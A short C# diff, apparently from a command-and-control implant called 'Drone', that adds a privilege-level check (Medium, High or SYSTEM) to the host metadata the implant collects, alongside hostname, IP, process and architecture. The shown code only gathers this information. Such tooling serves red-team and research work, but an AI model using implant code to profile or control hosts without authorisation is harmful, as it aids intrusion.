@@ -3,6 +3,7 @@ using System.Diagnostics;
 using System.Linq;
 using System.Net;
 using System.Net.Sockets;
+using System.Security.Principal;
 
 using Drone.Models;
 using Drone.Modules;
@@ -11,8 +12,6 @@ namespace Drone
 {
     public static class Utilities
     {
-        public static bool IsProcess64Bit => IntPtr.Size == 8;
-
         public static Metadata GenerateMetadata()
         {
             var hostname = Dns.GetHostName();
@@ -27,8 +26,25 @@ namespace Drone
                 Address = addresses.LastOrDefault(a => a.AddressFamily == AddressFamily.InterNetwork)?.ToString(),
                 Process = process.ProcessName,
                 Pid = process.Id,
-                Arch = IsProcess64Bit ? "x64" : "x86"
+                Integrity = GetDroneIntegrity,
+                Arch = Environment.Is64BitProcess ? Metadata.DroneArch.x64 : Metadata.DroneArch.x86
             };
+        }
+
+        private static Metadata.DroneIntegrity GetDroneIntegrity
+        {
+            get
+            {
+                var integrity = Metadata.DroneIntegrity.Medium;
+
+                using var identity = WindowsIdentity.GetCurrent();
+                if (identity.Name.Equals("SYSTEM", StringComparison.OrdinalIgnoreCase))
+                    integrity = Metadata.DroneIntegrity.SYSTEM;
+                else if (identity.Owner != identity.User)
+                    integrity = Metadata.DroneIntegrity.High;
+
+                return integrity;
+            }
         }
 
         public static DroneConfig GenerateDefaultConfig()
